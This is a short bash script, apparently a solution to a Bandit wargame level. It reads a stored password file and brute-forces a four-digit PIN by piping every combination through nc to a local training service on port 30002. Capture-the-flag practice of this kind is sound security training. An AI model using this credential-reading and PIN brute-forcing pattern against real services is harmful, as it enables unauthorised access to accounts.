#!/bin/bash
pass24=$(cat /etc/bandit_pass/bandit24)
touch /tmp/ahmedatef24/pass25
for i in {0000..9999}
   do
        echo "$pass24 $i"

   done | nc localhost 30002 >> /tmp/ahmedatef24/pass25

cat pass25 | grep -i -A 1  ^correct
